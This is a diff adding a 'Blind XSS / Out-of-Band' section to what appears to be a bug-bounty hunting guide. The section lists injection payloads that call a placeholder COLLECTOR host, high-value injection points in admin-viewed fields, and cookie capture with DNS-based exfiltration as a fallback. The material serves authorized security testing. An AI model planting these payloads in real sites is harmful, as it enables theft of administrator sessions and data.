@@ -88,6 +88,40 @@ If app accesses x.y, it follows the href → XSS
 |-----|----------|-------|
 | CWE-79 | Medium–Critical | Depends on context: stored DOM XSS is Critical; reflected with user interaction is Medium |
 
+### Blind XSS / Out-of-Band (OAST) — Admin Panel Exploitation
+
+Blind XSS fires in contexts you never see — admin dashboards, support ticket viewers, log viewers, moderation queues. These consistently pay $3K–$20K+ because they execute in privileged admin sessions.
+
+**Setup (do this ONCE per hunting session):**
+1. Deploy an OAST collector: Burp Collaborator, interactsh (`interactsh-client`), or self-hosted XSS Hunter
+2. Start with **low-noise canary beacons** (DNS/HTTP-only callbacks) to confirm injection renders in an HTML context, then escalate to context-specific payloads:
+   ```
+   HTML breakout:  "><img src=https://COLLECTOR/canary-profilename>
+   Attribute:      " onfocus=fetch('https://COLLECTOR/attr') autofocus="
+   JS string:      '-fetch('https://COLLECTOR/js')-'
+   Template:       {{constructor.constructor('fetch("https://COLLECTOR/tpl")')()}}
+   ```
+3. Burp match-and-replace rule: auto-inject canary into specific fields during normal browsing
+
+**High-Value Injection Points:**
+- User profile fields (display name, bio, company, job title)
+- Support/help desk tickets (subject line, message body, attachment names)
+- Feedback forms, bug reports, feature requests
+- File upload filenames (`"><img src=https://COLLECTOR/fname>.pdf`)
+- Webhook URL fields, integration names, API key descriptions
+- Email headers (From name, Subject) processed by admin tools
+- User-Agent / Referer headers rendered in analytics dashboards
+- Error messages that get logged and viewed by ops teams
+
+**Verification & Proof:**
+- Callback hit alone proves stored XSS execution in a context you don't control — this IS the finding
+- Capture `document.domain` + `window.location` to prove admin-panel context
+- Cookie capture (`document.cookie`) only works for non-HttpOnly cookies; CSP may block `fetch` — use DNS-based exfil (`new Image().src`) as fallback
+- Screenshot or DOM dump via callback is strong follow-up proof but not required for initial report
+- If callback fires from admin domain: reportable as stored XSS in admin context regardless of data captured
+
+**False Positive Check:** Ensure the callback is from the target's admin domain, not a reflected echo in your own session. Verify `document.domain` in the callback data.
+
 ---
 
 ## 2. Prototype Pollution (Client-Side)
